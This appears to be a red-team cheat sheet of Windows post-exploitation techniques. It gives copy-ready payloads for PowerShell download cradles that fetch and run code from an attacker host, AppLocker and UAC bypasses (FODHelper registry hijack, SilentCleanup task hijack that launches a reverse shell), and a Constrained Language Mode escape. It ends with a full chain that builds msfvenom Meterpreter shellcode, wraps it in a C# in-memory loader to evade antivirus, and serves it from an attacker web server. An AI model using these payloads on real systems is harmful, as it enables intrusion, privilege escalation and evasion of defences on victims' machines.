# PowerShell Delivery, AppLocker & UAC Bypass

> **Pre-req:** `source /opt/venvTools/bin/activate`

## PowerShell Download Cradles

### Reflective Script Load (Proxy-Aware) [added: 2026-04]
- **Tags:** #DownloadCradle #IEX #WebClient #InMemory #FilelessExecution #PowerShell #T1059.001
- **Trigger:** Need to load a PowerShell script (e.g., PowerView.ps1) into memory without writing to disk
- **Prereq:** PowerShell session, outbound HTTP access to attacker web server
- **Yields:** Script loaded and executed in memory (fileless execution)
- **Opsec:** Med
- **Context:** Download and execute PowerShell script in memory (no disk write)
- **Payload/Method:**
  ```powershell
  IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/PowerView.ps1')
  ```

### Non-Proxy-Aware Cradle [added: 2026-04]
- **Tags:** #DownloadCradle #WinHTTP #ProxyBypass #FilelessExecution #PowerShell #T1059.001
- **Trigger:** System proxy blocks outbound downloads; need to bypass proxy for cradle delivery
- **Prereq:** PowerShell session, direct outbound HTTP access (proxy bypass possible)
- **Yields:** Script loaded in memory bypassing system proxy settings
- **Opsec:** Med
- **Context:** Bypasses system proxy settings — useful when proxy blocks downloads
- **Payload/Method:**
  ```powershell
  $h = New-Object -ComObject WinHttp.WinHttpRequest.5.1
  $h.open('GET', 'http://<ATTACKER_IP>/script.ps1', $false)
  $h.send()
  IEX $h.responseText
  ```

### Reflective C# Assembly Load (Run Rubeus/SharpHound In-Memory) [added: 2026-04]
- **Tags:** #AssemblyLoad #Reflection #Rubeus #SharpHound #InMemory #ExecuteAssembly #T1620
- **Trigger:** Need to run compiled C# tools (Rubeus, SharpHound, etc.) without dropping to disk
- **Prereq:** PowerShell session, outbound HTTP to attacker server, .NET assemblies hosted
- **Yields:** C# tool execution in memory (Rubeus, SharpHound, etc.) without disk artifact
- **Opsec:** Med
- **Context:** Load and execute compiled C# assemblies without touching disk
- **Payload/Method:**
  ```powershell
  # Load and run Rubeus with arguments
  $data = (New-Object System.Net.WebClient).DownloadData('http://<ATTACKER_IP>/Rubeus.exe')
  $assem = [System.Reflection.Assembly]::Load($data)
  [Rubeus.Program]::Main("s4u /user:web01$ /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/fileserver".Split())

  # Load a DLL and call specific method
  $data = (New-Object System.Net.WebClient).DownloadData('http://<ATTACKER_IP>/ClassLibrary1.dll')
  $assem = [System.Reflection.Assembly]::Load($data)
  $class = $assem.GetType("ClassLibrary1.Class1")
  $method = $class.GetMethod("runner")
  $method.Invoke(0, $null)
  ```

### Encode PowerShell Command for Execution Policy Bypass [added: 2026-04]
- **Tags:** #EncodedCommand #Base64 #ExecutionPolicyBypass #PowerShell #Obfuscation #T1059.001
- **Trigger:** Execution policy restricts script execution; need to run commands via encoded parameter
- **Prereq:** PowerShell access (even restricted), ability to pass -EncodedCommand parameter
- **Yields:** Arbitrary PowerShell execution bypassing execution policy restrictions
- **Opsec:** Med
- **Context:** Run commands through `-EncodedCommand` to bypass restricted execution policy
- **Payload/Method:**
  ```powershell
  # Encode a one-liner
  $command = 'IEX (New-Object Net.WebClient).DownloadString("http://<ATTACKER_IP>/script.ps1")'
  $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
  $encodedCommand = [Convert]::ToBase64String($bytes)

  # Encode an existing script file
  [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('C:\path\script.ps1'))

  # Execute
  powershell.exe -EncodedCommand $encodedCommand
  powershell.exe -exec bypass -EncodedCommand $encodedCommand
  ```

## AppLocker Bypass Techniques

### AppLocker Bypass via Writable Paths [added: 2026-04]
- **Tags:** #AppLocker #WritablePaths #LOLBAS #ADS #AlternateDataStreams #Bypass #T1218
- **Trigger:** AppLocker blocks unsigned executables; need to find writable paths or alternate execution methods
- **Prereq:** Shell access on target, AppLocker policy active, writable paths under allowed directories
- **Yields:** Code execution bypassing AppLocker executable restrictions
- **Opsec:** Med
- **Context:** AppLocker allows `C:\Windows` but not unsigned binaries — drop to whitelisted paths or use LOLBAS
- **Payload/Method:**
  ```
  # Writable paths under C:\Windows (if AppLocker allows C:\Windows\*):
  C:\Windows\Temp\
  C:\Windows\Tasks\

  # If no writable subdirs but writable files exist — use Alternate Data Streams:
  type payload.js > C:\Windows\Tasks\legitimate.txt:payload.js
  wscript C:\Windows\Tasks\legitimate.txt:payload.js

  # Wrap binary as DLL to bypass executable rules:
  rundll32.exe payload.dll,EntryPoint

  # If Python/other interpreters allowed:
  python payload.py

  # XSL via wmic (LOLBAS):
  wmic os get /format:"http://<ATTACKER_IP>/payload.xsl"
  ```

### AppLocker Enumeration [added: 2026-04]
- **Tags:** #AppLocker #PolicyEnum #TestAppLockerPolicy #SecurityControls #Enumeration #T1518.001
- **Trigger:** Landed on a host; need to understand AppLocker restrictions before attempting bypass
- **Prereq:** PowerShell access on target host
- **Yields:** Effective AppLocker rules and whether a specific binary is allowed/blocked
- **Opsec:** Low
- **Context:** Before attempting bypass, enumerate what AppLocker rules are in effect and test if your binary is allowed.
- **Payload/Method:**
  ```powershell
  Get-AppLockerPolicy -Effective -Xml
  Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\Tools\payload.exe -User <username>
  ```

### AppLocker Bypass: InstallUtil Uninstall Method [added: 2026-04]
- **Tags:** #AppLocker #InstallUtil #LOLBIN #DotNET #UninstallMethod #Bypass #T1218.004
- **Trigger:** AppLocker blocks executables but .NET framework directory binaries are allowed
- **Prereq:** Ability to compile C# or transfer pre-compiled .exe, InstallUtil.exe accessible
- **Yields:** Arbitrary code execution via InstallUtil /U bypassing AppLocker executable restrictions
- **Opsec:** Med
- **Context:** AppLocker blocks executables but InstallUtil.exe is a LOLBIN in the .NET framework directory. Compile C# with an Installer class that executes code in the Uninstall method.
- **Payload/Method:**
  ```csharp
  // Compile as .exe, then run via InstallUtil /U
  using System;
  using System.Configuration.Install;
  public class NotMalware_IU { public static void Main(string[] args) { } }
  [System.ComponentModel.RunInstaller(true)]
  public class A : System.Configuration.Install.Installer {
      public override void Uninstall(System.Collections.IDictionary savedState) {
          // CODE EXECUTION HERE
      }
  }
  ```
  ```powershell
  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U YourFile.exe
  ```

### AppLocker Bypass: RunDll32 with DllExport [added: 2026-04]
- **Tags:** #AppLocker #RunDll32 #DllExport #DLLBypass #LOLBIN #Bypass #T1218.011
- **Trigger:** AppLocker restricts EXE execution but not DLL loading; can compile C# with DllExport
- **Prereq:** Ability to compile C# DLL with DllExport attribute, rundll32.exe accessible
- **Yields:** Arbitrary code execution via rundll32 DLL loading, bypassing AppLocker EXE restrictions
- **Opsec:** Med
- **Context:** AppLocker may not restrict DLL execution. Compile C# with DllExport attribute and invoke via rundll32.
- **Payload/Method:**
  ```csharp
  namespace RShell_D {
      internal class Program {
          [DllExport("DllMain")]
          public static void DllMain() { /* CODE EXECUTION */ }
      }
  }
  ```
  ```powershell
  C:\Windows\System32\RunDll32.exe YourFile.dll,DllMain
  ```

## UAC Bypass

### FODHelper UAC Bypass (No Prompt — Auto-Elevate via Registry) [added: 2026-04]
- **Tags:** #UACBypass #FODHelper #Registry #AutoElevate #PrivilegeEscalation #LOLBAS #T1548.002
- **Trigger:** Medium integrity shell obtained; need to elevate to high integrity without UAC prompt
- **Prereq:** Medium integrity shell, current user is in local Administrators group, UAC not set to "Always Notify"
- **Yields:** High integrity shell (elevated) without UAC prompt
- **Opsec:** Med
- **Context:** Medium integrity shell — elevate to high integrity without UAC prompt
- **Payload/Method:**
  ```powershell
  # The command to execute at high integrity
  $cmd = "cmd /c start powershell.exe"

  # Write to registry key that fodhelper reads at launch
  New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
  New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" \
    -Name "DelegateExecute" -Value "" -Force
  Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" \
    -Name "(default)" -Value $cmd -Force

  # Trigger bypass
  Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

  # Cleanup
  Start-Sleep 3
  Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
  ```

### UAC Bypass: DiskCleanup Scheduled Task Hijack [added: 2026-04]
- **Tags:** #UACBypass #DiskCleanup #SilentCleanup #EnvVariable #ScheduledTask #PrivilegeEscalation #T1548.002
- **Trigger:** Medium integrity shell; FODHelper blocked or detected; need alternate UAC bypass via scheduled task hijack
- **Prereq:** Medium integrity shell, user in local Administrators group, SilentCleanup task exists
- **Yields:** High integrity command execution via hijacked SilentCleanup scheduled task
- **Opsec:** Med
- **Context:** Hijack the SilentCleanup scheduled task via the `windir` environment variable. Task runs as high integrity and reads `%windir%`. Overwrite to inject command execution.
- **Payload/Method:**
  ```powershell
  Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value "cmd.exe /K C:\Windows\Tasks\RShell.exe <IP> 8080 & REM " -Force
  Start-ScheduledTask -TaskPath "\Microsoft\Windows\DiskCleanup" -TaskName "SilentCleanup"
  # Cleanup
  Clear-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Force
  ```

## Constrained Language Mode

### Constrained Language Mode Bypass via C# Runspace [added: 2026-04]
- **Tags:** #CLMBypass #ConstrainedLanguageMode #Runspace #CSharp #PowerShell #FullLanguage #T1059.001
- **Trigger:** PowerShell CLM active; cmdlets and .NET access restricted; need full language mode
- **Prereq:** Ability to compile and execute C# binary on target (or transfer pre-compiled)
- **Yields:** Full PowerShell language mode execution from within a C# runspace, bypassing CLM
- **Opsec:** Med
- **Context:** PowerShell CLM restricts cmdlets and .NET access. Compile a C# binary that creates a full-language Runspace to execute arbitrary PowerShell.
- **Payload/Method:**
  ```csharp
  Runspace runspace = RunspaceFactory.CreateRunspace();
  runspace.Open();
  PowerShell ps = PowerShell.Create();
  ps.Runspace = runspace;
  ps.AddScript(String.Join(" ", args));
  Collection<PSObject> results = ps.Invoke();
  foreach (PSObject obj in results) { Console.WriteLine(obj.ToString()); }
  runspace.Close();
  ```

### C# Shellcode Loader (VirtualProtect Delegate, AV Bypass) [added: 2026-04]
- **Tags:** #CSharpLoader #Shellcode #DefenseEvasion #AMSI #AVBypass #Meterpreter #VirtualProtect
- **Trigger:** AV/Defender blocks standard Meterpreter .exe uploads; need interactive shell from non-interactive WinRM context
- **Prereq:** Linux attacker with mono-mcs; Evil-WinRM or similar shell; RunAsCs.exe on target; Python3 web server reachable; Metasploit handler ready
- **Yields:** Interactive Meterpreter session as target user, bypassing Windows Defender; enables tools requiring interactive logon (PowerUp, Whisker, etc.)
- **Opsec:** Med
- **Context:** Standard msfvenom .exe is AV-detected. This chain: (1) generates raw shellcode, (2) wraps it in a C# in-memory loader using VirtualProtect+delegate execution (no disk-written shellcode), (3) compiles on Linux with mono, (4) loads via PowerShell Assembly::Load (fileless), (5) RunAsCs -l 3 forces an interactive logon type needed for UAC-sensitive tools.
- **Payload/Method:**
  ```bash
  # 1. Generate raw shellcode
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f raw -o zephyr-win.bin

  # 2. C# loader (save as payload.cs)
  cat > payload.cs << 'EOF'
  using System; using System.Net; using System.Runtime.InteropServices;
  namespace Loader {
    public class Program {
      public delegate void Grunt();
      [DllImport("kernel32.dll")]
      public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
      public static void Main() {
        var wc = new WebClient();
        var sc = wc.DownloadData("http://<IP>/zephyr-win.bin");
        GCHandle pinned = GCHandle.Alloc(sc, GCHandleType.Pinned);
        IntPtr ptr = pinned.AddrOfPinnedObject();
        Marshal.Copy(sc, 0, ptr, sc.Length);
        uint lpflOldProtect;
        VirtualProtect(ptr, (UIntPtr)sc.Length, 0x40, out lpflOldProtect);
        Grunt exec = Marshal.GetDelegateForFunctionPointer<Grunt>(ptr);
        exec();
      }
    }
  }
  EOF

  # 3. Compile on Linux
  sudo apt install mono-mcs -y
  mcs payload.cs    # produces payload.exe

  # 4. PowerShell wrapper (payload.ps1) — hosted on attacker web server
  cat > payload.ps1 << 'EOF'
  $bytes = (new-object net.webclient).downloaddata('http://<IP>/payload.exe')
  [System.Reflection.Assembly]::Load($bytes)
  [Reflection.Program]::Main()
  EOF

  # 5. Start web server serving both files + Metasploit handler
  sudo python3 -m http.server 80
  # msf: use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; run

  # 6. Trigger from Evil-WinRM using RunAsCs for interactive logon
  .\RunAsCs.exe -l 3 <user> <password> -d <domain> 'powershell iex(iwr -useb http://<IP>/payload.ps1)'
  ```
